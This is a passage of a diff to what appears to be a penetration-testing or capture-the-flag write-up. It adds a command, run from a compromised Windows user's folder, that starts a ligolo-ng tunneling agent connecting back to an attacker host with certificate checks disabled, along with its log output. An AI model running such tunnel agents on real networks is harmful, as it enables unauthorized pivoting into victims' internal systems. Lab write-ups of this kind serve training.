@@ -671,6 +671,10 @@ ligolo-ng »
 This has configured ligolo-ng routing info
 
 ```python
-
+C:\Users\C.Bum\Documents>agent.exe -connect 10.10.14.90:11601 --ignore-cert
+agent.exe -connect 10.10.14.90:11601 --ignore-cert
+time="2026-04-01T14:56:49-07:00" level=warning msg="warning, certificate validation disabled"
+time="2026-04-01T14:56:49-07:00" level=info msg="Connection established" addr="10.10.14.90:11601"
 ```
+This triggered a con
 
